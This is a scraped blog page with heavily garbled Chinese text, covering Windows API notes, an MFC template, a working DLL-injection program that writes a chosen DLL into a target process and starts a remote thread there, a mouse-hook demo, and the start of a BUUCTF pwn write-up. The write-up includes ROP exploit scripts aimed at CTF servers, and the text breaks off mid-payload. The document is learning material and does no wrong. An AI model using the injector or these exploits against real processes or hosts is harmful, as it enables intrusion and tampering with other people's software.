lpcbMaxValueLen,//æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶é”®å€¼ä¸­æœ€é•¿çš„æ•°æ®åˆ†é‡çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ _Out_opt_ LPDWORD lpcbSecurityDescriptor,//æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶å¯†é’¥çš„å®‰å…¨æè¿°ç¬¦çš„å¤§å° _Out_opt_ PFILETIME lpftLastWriteTime//æŒ‡å‘æ¥æ”¶æœ€åå†™å…¥æ—¶é—´çš„FILETIMEç»“æ„çš„æŒ‡é’ˆ ã€‚æ­¤å‚æ•°å¯ä»¥ä¸ºNULL ); 3.æ³¨å†Œè¡¨å†™å…¥ 1234567891011WINADVAPILSTATUSAPIENTRYRegSetKeyValueA( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ LPCSTR lpValueName, _In_ DWORD dwType, _In_reads_bytes_opt_(cbData) LPCVOID lpData, _In_ DWORD cbData ); 4.æ³¨å†Œè¡¨å€¼çš„æšä¸¾ 12345678910111213WINADVAPILSTATUSAPIENTRYRegEnumKeyExA( _In_ HKEY hKey, _In_ DWORD dwIndex, //æŸ¥è¯¢ç´¢å¼• _Out_writes_to_opt_(*lpcchName,*lpcchName + 1) LPSTR lpName,//å­é”®åç§° _Inout_ LPDWORD lpcchName, //å¦‚æœå‡½æ•°æˆåŠŸï¼Œåˆ™ç”±lpcNameæŒ‡å‘çš„å˜é‡å°†åŒ…å«å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­çš„å­—ç¬¦æ•°ï¼Œä¸åŒ…æ‹¬ç»ˆæ­¢çš„ç©ºå­—ç¬¦ _Reserved_ LPDWORD lpReserved, //æ­¤å‚æ•°æ˜¯ä¿ç•™å‚æ•°ï¼Œå¿…é¡»ä¸ºNULL _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,//è¯¥ç¼“å†²åŒºæ¥æ”¶æšä¸¾å­é¡¹çš„ç”¨æˆ·å®šä¹‰ç±» _Inout_opt_ LPDWORD lpcchClass, //å¦‚æœå‡½æ•°æˆåŠŸï¼Œåˆ™lpcClassåŒ…å«ç¼“å†²åŒºä¸­å­˜å‚¨çš„å­—ç¬¦æ•°ï¼Œä¸åŒ…æ‹¬ç»ˆæ­¢çš„ç©ºå­—ç¬¦ _Out_opt_ PFILETIME lpftLastWriteTime//æŒ‡å‘FILETIMEç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„æ¥æ”¶ä¸Šä¸€æ¬¡å†™å…¥æšä¸¾å­é”®çš„æ—¶é—´ ); 5.é”®å€¼åˆ é™¤ 1234567WINADVAPILSTATUSAPIENTRYRegDeleteKeyA ( _In_ HKEY hKey, _In_ LPCSTR lpSubKey ); æ–‡ä»¶æ“ä½œç›¸å…³ 1.æ‰“å¼€æ–‡ä»¶ 123456789CreateFileA( _In_ LPCSTR lpFileName, //è¦æ‰“å¼€çš„æ–‡ä»¶åå­— _In_ DWORD dwDesiredAccess, //è®¿é—®æ¨¡å¼ _In_ DWORD dwShareMode, //æ–‡ä»¶çš„å…±äº«æ¨¡å¼ _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, //å®‰å…¨å±æ€§ _In_ DWORD dwCreationDisposition, //åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶ä¸å­˜åœ¨æ—¶çš„æ“ä½œ _In_ DWORD dwFlagsAndAttributes, //åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶çš„æ ‡å¿—å’Œå±æ€§ _In_opt_ HANDLE hTemplateFile //æ–‡ä»¶æ¨¡æ¿); 2.å…³é—­æ–‡ä»¶ 123CloseHandle( _In_ _Post_ptr_invalid_ HANDLE hObject ); 3.åˆ é™¤æ–‡ä»¶ 12345BOOLWINAPIDeleteFileA( _In_ LPCSTR lpFileName ); 4.è¯»å‡½æ•° 1234567891011WINBASEAPI_Must_inspect_result_BOOLWINAPIReadFile( _In_ HANDLE hFile, //æ–‡ä»¶å¥æŸ„ _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) __out_data_source(FILE) LPVOID lpBuffer, //æŒ‡å‘ä¸€ä¸ªç¼“å†²åŒºï¼ŒæŠŠæ•°æ®è¯»å–åˆ°é‡Œé¢ _In_ DWORD nNumberOfBytesToRead, //è¦è¯»å–çš„å­—èŠ‚æ•° _Out_opt_ LPDWORD lpNumberOfBytesRead, //è¿”å›å®é™…çš„è¯»å–æ•° _Inout_opt_ LPOVERLAPPED lpOverlapped //ä¸€èˆ¬è®¾ç½®ä¸ºNULL ); 5.å†™å‡½æ•° 12345678910WINBASEAPIBOOLWINAPIWriteFile( _In_ HANDLE hFile, _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped ); 6.è®¾ç½®æ–‡ä»¶æŒ‡é’ˆ 123456789WINBASEAPIDWORDWINAPISetFilePointer( _In_ HANDLE hFile, //æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„ _In_ LONG lDistanceToMove, //æŒ‡å®šè¦ç§»åŠ¨çš„è·ç¦» _Inout_opt_ PLONG lpDistanceToMoveHigh, //è¦ç§»åŠ¨è·ç¦»çš„é«˜32ä½ _In_ DWORD dwMoveMethod //æŒ‡å®šç§»åŠ¨ä½ç½® ); 7.åˆ›å»ºç›®å½• 1234567WINBASEAPIBOOLWINAPICreateDirectoryA( _In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes ); 8.ç§»åŠ¨ç›®å½• 123456WINBASEAPIBOOLWINAPIRemoveDirectoryA( _In_ LPCSTR lpPathName ); AutoImmunityçš„MFCåˆä½“éªŒ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// AutoRunImmunity.cpp: å®šä¹‰åº”ç”¨ç¨‹åºçš„ç±»è¡Œä¸ºã€‚//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;AutoRunImmunity.h&quot;#include &quot;AutoRunImmunityDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CAutoRunImmunityAppBEGIN_MESSAGE_MAP(CAutoRunImmunityApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CAutoRunImmunityApp æ„é€ CAutoRunImmunityApp::CAutoRunImmunityApp()&#123; // æ”¯æŒé‡æ–°å¯åŠ¨ç®¡ç†å™¨ m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: åœ¨æ­¤å¤„æ·»åŠ æ„é€ ä»£ç ï¼Œ // å°†æ‰€æœ‰é‡è¦çš„åˆå§‹åŒ–æ”¾ç½®åœ¨ InitInstance ä¸­&#125;// å”¯ä¸€çš„ CAutoRunImmunityApp å¯¹è±¡CAutoRunImmunityApp theApp;// CAutoRunImmunityApp åˆå§‹åŒ–BOOL CAutoRunImmunityApp::InitInstance()&#123; // å¦‚æœä¸€ä¸ªè¿è¡Œåœ¨ Windows XP ä¸Šçš„åº”ç”¨ç¨‹åºæ¸…å•æŒ‡å®šè¦ // ä½¿ç”¨ ComCtl32.dll ç‰ˆæœ¬ 6 æˆ–æ›´é«˜ç‰ˆæœ¬æ¥å¯ç”¨å¯è§†åŒ–æ–¹å¼ï¼Œ //åˆ™éœ€è¦ InitCommonControlsEx()ã€‚ å¦åˆ™ï¼Œå°†æ— æ³•åˆ›å»ºçª—å£ã€‚ INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // å°†å®ƒè®¾ç½®ä¸ºåŒ…æ‹¬æ‰€æœ‰è¦åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ // å…¬å…±æ§ä»¶ç±»ã€‚ InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // åˆ›å»º shell ç®¡ç†å™¨ï¼Œä»¥é˜²å¯¹è¯æ¡†åŒ…å« // ä»»ä½• shell æ ‘è§†å›¾æ§ä»¶æˆ– shell åˆ—è¡¨è§†å›¾æ§ä»¶ã€‚ CShellManager *pShellManager = new CShellManager; // æ¿€æ´»â€œWindows Nativeâ€è§†è§‰ç®¡ç†å™¨ï¼Œä»¥ä¾¿åœ¨ MFC æ§ä»¶ä¸­å¯ç”¨ä¸»é¢˜ CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // æ ‡å‡†åˆå§‹åŒ– // å¦‚æœæœªä½¿ç”¨è¿™äº›åŠŸèƒ½å¹¶å¸Œæœ›å‡å° // æœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œåˆ™åº”ç§»é™¤ä¸‹åˆ— // ä¸éœ€è¦çš„ç‰¹å®šåˆå§‹åŒ–ä¾‹ç¨‹ // æ›´æ”¹ç”¨äºå­˜å‚¨è®¾ç½®çš„æ³¨å†Œè¡¨é¡¹ // TODO: åº”é€‚å½“ä¿®æ”¹è¯¥å­—ç¬¦ä¸²ï¼Œ // ä¾‹å¦‚ä¿®æ”¹ä¸ºå…¬å¸æˆ–ç»„ç»‡å SetRegistryKey(_T(&quot;åº”ç”¨ç¨‹åºå‘å¯¼ç”Ÿæˆçš„æœ¬åœ°åº”ç”¨ç¨‹åº&quot;)); CAutoRunImmunityDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œç¡®å®šâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == IDCANCEL) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œå–æ¶ˆâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¯¹è¯æ¡†åˆ›å»ºå¤±è´¥ï¼Œåº”ç”¨ç¨‹åºå°†æ„å¤–ç»ˆæ­¢ã€‚\\n&quot;); TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¦‚æœæ‚¨åœ¨å¯¹è¯æ¡†ä¸Šä½¿ç”¨ MFC æ§ä»¶ï¼Œåˆ™æ— æ³• #define _AFX_NO_MFC_CONTROLS_IN_DIALOGSã€‚\\n&quot;); &#125; // åˆ é™¤ä¸Šé¢åˆ›å»ºçš„ shell ç®¡ç†å™¨ã€‚ if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // ç”±äºå¯¹è¯æ¡†å·²å…³é—­ï¼Œæ‰€ä»¥å°†è¿”å› FALSE ä»¥ä¾¿é€€å‡ºåº”ç”¨ç¨‹åºï¼Œ // è€Œä¸æ˜¯å¯åŠ¨åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯æ³µã€‚ return FALSE;&#125; DLLæ³¨å…¥ DLL_Helloworld 1234567891011121314151617181920212223242526272829303132333435363738394041424344// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;const int MaxLen = 0x50;//extern &quot;C&quot; __declspec(dllexport) //VOID MsgBox(wchar_t*szMsg)//&#123;// wchar_t szModuleName[MaxLen];// GetModuleFileName(NULL, szModuleName, MaxLen);// MessageBox(NULL,szMsg,szModuleName,MB_OK);//&#125;VOID MsgBox(wchar_t* szMsg)&#123; wchar_t szModuleName[MaxLen]; GetModuleFileName(NULL, szModuleName, MaxLen); MessageBoxW(NULL, szMsg, szModuleName, MB_OK);&#125;BOOL APIENTRY DllMain(HMODULE hModule, //DLLæ¨¡å—å¥æŸ„ DWORD ul_reason_for_call,//è¢«è°ƒç”¨åŸå›  LPVOID lpReserved //ä¿ç•™æƒ³ï¼Œå‚»é€¼windows)//å…¥å£å‡½æ•°&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; MessageBoxA(NULL, &quot;HI&quot;, &quot;Attached&quot;, MB_OK); break; &#125; case DLL_THREAD_ATTACH: &#123; MsgBox((wchar_t*)&quot;Thread attached&quot;); break; &#125; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; DLLæ³¨å…¥ æ³¨å…¥å™¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;string&gt;#include &lt;cstring&gt;const int MaxLen = 0x50;using namespace std;int main()&#123; char DllPath[MaxLen]; DWORD PID; cout &lt;&lt; &quot;Which DLL To Load?\\n&quot;; cin &gt;&gt; DllPath; if (DllPath == NULL) cout &lt;&lt; &quot;This Dll Not exsits\\n&quot;; cout &lt;&lt; DllPath &lt;&lt; endl; //LoadLibraryA((LPCSTR)DllPath); cout &lt;&lt; &quot;Which Program want to hijack?\\n&quot;; cin &gt;&gt; PID; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID); if (hProcess == NULL) &#123; cout &lt;&lt; &quot;This process is missing\\n&quot;; exit(-1); &#125; int DllLen = strlen(DllPath) + sizeof(char); PVOID pDllAddr = VirtualAllocEx( hProcess,NULL,DllLen,MEM_COMMIT,PAGE_READWRITE ); if (pDllAddr == NULL) &#123; CloseHandle(hProcess); cout &lt;&lt; &quot;Handle ERROR\\n&quot;; exit(-1); &#125; DWORD dwWriteNum = 0; cout &lt;&lt; &quot;Writting Mem\\n&quot;; WriteProcessMemory( hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum ); cout &lt;&lt; &quot;GetProcAddr\\n&quot;; FARPROC pFunAddr = GetProcAddress( GetModuleHandle((LPCWSTR)&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot; ); cout &lt;&lt; &quot;CreateRemoteThread\\n&quot;; HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL ); cout &lt;&lt; &quot;Close Handles\\n&quot;; WaitForSingleObject(hThread,INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; å¾…æ³¨å…¥DLL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Injector.cpp: å®šä¹‰åº”ç”¨ç¨‹åºçš„ç±»è¡Œä¸ºã€‚//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Injector.h&quot;#include &quot;InjectorDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CInjectorAppBEGIN_MESSAGE_MAP(CInjectorApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CInjectorApp æ„é€ CInjectorApp::CInjectorApp()&#123; // æ”¯æŒé‡æ–°å¯åŠ¨ç®¡ç†å™¨ m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: åœ¨æ­¤å¤„æ·»åŠ æ„é€ ä»£ç ï¼Œ // å°†æ‰€æœ‰é‡è¦çš„åˆå§‹åŒ–æ”¾ç½®åœ¨ InitInstance ä¸­&#125;// å”¯ä¸€çš„ CInjectorApp å¯¹è±¡CInjectorApp theApp;// CInjectorApp åˆå§‹åŒ–BOOL CInjectorApp::InitInstance()&#123; // å¦‚æœä¸€ä¸ªè¿è¡Œåœ¨ Windows XP ä¸Šçš„åº”ç”¨ç¨‹åºæ¸…å•æŒ‡å®šè¦ // ä½¿ç”¨ ComCtl32.dll ç‰ˆæœ¬ 6 æˆ–æ›´é«˜ç‰ˆæœ¬æ¥å¯ç”¨å¯è§†åŒ–æ–¹å¼ï¼Œ //åˆ™éœ€è¦ InitCommonControlsEx()ã€‚ å¦åˆ™ï¼Œå°†æ— æ³•åˆ›å»ºçª—å£ã€‚ INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // å°†å®ƒè®¾ç½®ä¸ºåŒ…æ‹¬æ‰€æœ‰è¦åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ // å…¬å…±æ§ä»¶ç±»ã€‚ InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // åˆ›å»º shell ç®¡ç†å™¨ï¼Œä»¥é˜²å¯¹è¯æ¡†åŒ…å« // ä»»ä½• shell æ ‘è§†å›¾æ§ä»¶æˆ– shell åˆ—è¡¨è§†å›¾æ§ä»¶ã€‚ CShellManager *pShellManager = new CShellManager; // æ¿€æ´»â€œWindows Nativeâ€è§†è§‰ç®¡ç†å™¨ï¼Œä»¥ä¾¿åœ¨ MFC æ§ä»¶ä¸­å¯ç”¨ä¸»é¢˜ CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // æ ‡å‡†åˆå§‹åŒ– // å¦‚æœæœªä½¿ç”¨è¿™äº›åŠŸèƒ½å¹¶å¸Œæœ›å‡å° // æœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œåˆ™åº”ç§»é™¤ä¸‹åˆ— // ä¸éœ€è¦çš„ç‰¹å®šåˆå§‹åŒ–ä¾‹ç¨‹ // æ›´æ”¹ç”¨äºå­˜å‚¨è®¾ç½®çš„æ³¨å†Œè¡¨é¡¹ // TODO: åº”é€‚å½“ä¿®æ”¹è¯¥å­—ç¬¦ä¸²ï¼Œ // ä¾‹å¦‚ä¿®æ”¹ä¸ºå…¬å¸æˆ–ç»„ç»‡å SetRegistryKey(_T(&quot;åº”ç”¨ç¨‹åºå‘å¯¼ç”Ÿæˆçš„æœ¬åœ°åº”ç”¨ç¨‹åº&quot;)); CInjectorDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œç¡®å®šâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == IDCANCEL) &#123; // TODO: åœ¨æ­¤æ”¾ç½®å¤„ç†ä½•æ—¶ç”¨ // â€œå–æ¶ˆâ€æ¥å…³é—­å¯¹è¯æ¡†çš„ä»£ç  &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¯¹è¯æ¡†åˆ›å»ºå¤±è´¥ï¼Œåº”ç”¨ç¨‹åºå°†æ„å¤–ç»ˆæ­¢ã€‚\\n&quot;); TRACE(traceAppMsg, 0, &quot;è­¦å‘Š: å¦‚æœæ‚¨åœ¨å¯¹è¯æ¡†ä¸Šä½¿ç”¨ MFC æ§ä»¶ï¼Œåˆ™æ— æ³• #define _AFX_NO_MFC_CONTROLS_IN_DIALOGSã€‚\\n&quot;); &#125; // åˆ é™¤ä¸Šé¢åˆ›å»ºçš„ shell ç®¡ç†å™¨ã€‚ if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // ç”±äºå¯¹è¯æ¡†å·²å…³é—­ï¼Œæ‰€ä»¥å°†è¿”å› FALSE ä»¥ä¾¿é€€å‡ºåº”ç”¨ç¨‹åºï¼Œ // è€Œä¸æ˜¯å¯åŠ¨åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯æ³µã€‚ return FALSE;&#125; Hookç¼–ç¨‹ï¼ˆè¿›ç¨‹Hookï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;windows.h&gt;LRESULT CALLBACK WindowProc( //CALLBACK ä»å³å‘å·¦å…¥æ ˆ //LRESULT long //è¯¥å‡½æ•°å¤„ç†çª—å£æ¶ˆæ¯ HWND hWnd,//çª—å£å¥æŸ„ç±»å‹ UINT uMsg,//unsigned int, æ¶ˆæ¯ WPARAM wParam,//unsigned int LPARAM lParam //long int);HHOOK MouseHook;//é¼ æ ‡é’©å­å¤„ç†å‡½æ•°LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( //çª—å£åº”ç”¨GUI HINSTANCE hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ //HINSTANCE ï¼šå®ä¾‹å¥æŸ„ç±»å‹ HINSTANCE hPreInstance, //ä¸ºäº†å…¼å®¹16ä½åº”ç”¨ç¨‹åºï¼Œæ°¸è¿œä¸ºç©º LPSTR lpCmdLine, //å‘½ä»¤è¡Œå‚æ•° //LPSTRï¼šchar * int nCmdShow //çª—å£çš„æ˜¾ç¤ºæ–¹å¼)&#123; //1.åšä¸€ä¸ªçª—å£ //1.1è®¾è®¡çª—å£ç±» Spy++ TCHAR szAppClassName[] = TEXT(&quot;Joe1sn&quot;);//è‡ªåŠ¨é€‚åº”å­—ç¬¦é›† WNDCLASS wndClass = &#123; 0 &#125;; wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//åŠ è½½ç™½è‰²ç”»åˆ· wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);//åŠ è½½å…‰æ ‡ wndClass.hInstance = hInstance;//å½“å‰çª—å£å®ä¾‹å¥æŸ„ wndClass.lpfnWndProc = WindowProc;//çª—å£å¤„ç†å‡½æ•° wndClass.lpszClassName = szAppClassName;//çª—å£ç±»å‹ wndClass.style = CS_HREDRAW | CS_VREDRAW; //çª—å£ç±»çš„é£æ ¼ //1.2æ³¨å†Œçª—å£ç±» RegisterClass(&amp;wndClass); //1.3åˆ›å»ºçª—å£ç±» HWND hWnd = CreateWindow(szAppClassName, TEXT(&quot;Test&quot;), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 500, 200, 800, 600, NULL, NULL, hInstance, NULL ); //1.4æ˜¾ç¤ºå’Œæ›´æ–°çª—å£ ShowWindow(hWnd,SW_SHOW);//æ˜¾ç¤º UpdateWindow(hWnd);//æ›´æ–°çª—å£ //1.5æ¶ˆæ¯å¾ªç¯ //ï¼ˆå‚è€ƒQTçš„ä¿¡å·å’Œæ§½?ï¼‰ //åº”ç”¨ç¨‹åº-&gt;æ“ä½œç³»ç»Ÿ-&gt;æ¶ˆæ¯é˜Ÿåˆ—-&gt;åº”ç”¨ç¨‹åº MSG msg; while (GetMessage(&amp;msg,NULL,0,0))//æ‰€æœ‰æ¶ˆæ¯éƒ½è¦è·å– //WM_QITï¼Œè¿”å›0ï¼Œç»“æŸå¾ªç¯ &#123; //å°†è™šæ‹Ÿé”®æ¶ˆæ¯è½¬ä¸ºå­—ç¬¦æ¶ˆæ¯ //windowsåªèƒ½è¯†åˆ«è™šæ‹Ÿé”®å€¼ VK_UP VK_DOWN TranslateMessage(&amp;msg); //å°†æ¶ˆæ¯åˆ†å‘ç»™çª—å£å¤„ç†å‡½æ•° //è¿™é‡Œæ˜¯WinProc DispatchMessage(&amp;msg); &#125; return 0;&#125;//é¼ æ ‡é’©å­å¤„ç†å‡½æ•°LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; //int x = LOWORD(lParam); //int y = HIWORD(lParam); //x += 100; //lParam = MAKELONG(x,y); /*if (wParam == VK_F2) &#123; SendMessage(hWnd, WM_CLOSE, 0, 0); UnhookWindowsHookW(MouseHook); &#125;*/ return CallNextHookEx(MouseHook,nCode,wParam,lParam);//å‘ä¸‹ä¼ é€’ //return 1;//è¿”å›é0ï¼Œè¡¨ç¤ºæ¶ˆæ¯å·²è¢«å¤„ç†ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¸ä¼šæŠŠè¿™ä¸ªæ¶ˆæ¯ä¼ é€’ç»™ç¨‹åº&#125;LRESULT CALLBACK WindowProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)&#123; PAINTSTRUCT ps;// HDC hDC;//ç»˜å›¾DC switch (uMsg) &#123; //è¿›ç¨‹ç±»hook case WM_CREATE://çª—å£åˆ›å»ºæ¶ˆæ¯ &#123; //å®‰è£…hook MouseHook = SetWindowsHookEx(WH_MOUSE, MouseProc, NULL, GetCurrentThreadId()); break; &#125; case WM_CLOSE://çª—å£å…³é—­æ¶ˆæ¯ DestroyWindow(hWnd); break; case WM_DESTROY://çª—å£é”€æ¯æ¶ˆæ¯ PostQuitMessage(0);//å‘é€WM_QUITå°±ä¼šé€€å‡º case WM_PAINT://çª—å£ç»˜å›¾æ¶ˆæ¯ &#123; hDC = BeginPaint(hWnd, &amp;ps); HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 0, 0)); SelectObject(hDC, hPen); Ellipse(hDC, 0, 0, 200, 200); EndPaint(hWnd, &amp;ps); &#125; case WM_LBUTTONDOWN://é¼ æ ‡å·¦é”®ç‚¹å‡»æ¶ˆæ¯ &#123; MessageBox(hWnd, TEXT(&quot;Left&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_RBUTTONDOWN://é¼ æ ‡å³é”®ç‚¹å‡»æ¶ˆæ¯ &#123; MessageBox(hWnd, TEXT(&quot;Right&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_MOUSEMOVE: &#123; int x = LOWORD(lParam); int y = HIWORD(lParam); wchar_t str[0x100]; wsprintf(str, L&quot;å½“å‰é¼ æ ‡åæ ‡(%d , %d)&quot;,x,y); //SetWindowText(hWnd, TEXT(&quot;In&quot;)); SetWindowText(hWnd, str); &#125; &#125; return DefWindowProc(hWnd, uMsg, wParam, lParam);&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"BUUCTF Pwn WriteUp","slug":"BUUCTF","date":"2021-03-14T01:21:00.000Z","updated":"2023-08-25T03:24:08.350Z","comments":true,"path":"2021/03/14/BUUCTF/","link":"","permalink":"https://joe1sn.eu.org/2021/03/14/BUUCTF/","excerpt":"buuéƒ¨åˆ†åˆ·é¢˜è®°å½•","text":"buuéƒ¨åˆ†åˆ·é¢˜è®°å½• [HarekazeCTF2019]baby_rop 1.checksec() 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+0h] [rbp-10h] system(&quot;echo -n \\&quot;What&#x27;s your name? \\&quot;&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); printf(&quot;Welcome to the Pwn World, %s!\\n&quot;, &amp;v4); return 0;&#125; scanfçš„æº¢å‡ºï¼Œæ³¨æ„ï¼Œè¦æº¢å‡ºçš„æ ˆ+8 3.EXP 12345678910from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29829)binsh_addr = 0x0601048sys_addr = 0x00400490pop_rdi = 0x0400683payload = &#x27;a&#x27;*24 + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr) + p64(0)p.sendlineafter(&quot;?&quot;,payload)p.interactive() flagåœ¨homeæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤¹ä¸­ [HarekazeCTF2019]baby_rop2 ç¯å¢ƒï¼šï¼Ÿ 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char buf[28]; // [rsp+0h] [rbp-20h] int v6; // [rsp+1Ch] [rbp-4h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(&quot;What&#x27;s your name? &quot;, 0LL); v3 = read(0, buf, 0x100uLL); v6 = v3; buf[v3 - 1] = 0; printf(&quot;Welcome to the Pwn World again, %s!\\n&quot;, buf); return 0;&#125; printfè¾“å‡ºreadçš„çœŸå®åœ°å€ï¼Œå†ROP 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#from LibcSearcher import *context.log_level = &quot;debug&quot;elf=ELF(&#x27;./babyrop2&#x27;)libc = ELF(&quot;./libc.so.6&quot;)#p=process(&#x27;babyrop2&#x27;)p=remote(&#x27;node3.buuoj.cn&#x27;,28113)pop_rdi_ret=0x0000000000400733pop_rsi_r15_ret=0x0000000000400731format_addr=0x0000000000400790 # %sprintf_plt=elf.plt[&#x27;printf&#x27;]read_got=elf.got[&#x27;read&#x27;]main_plt=elf.sym[&#x27;main&#x27;]payload = &quot;a&quot;*0x28payload += p64(pop_rdi_ret) + p64(format_addr)payload += p64(pop_rsi_r15_ret) + 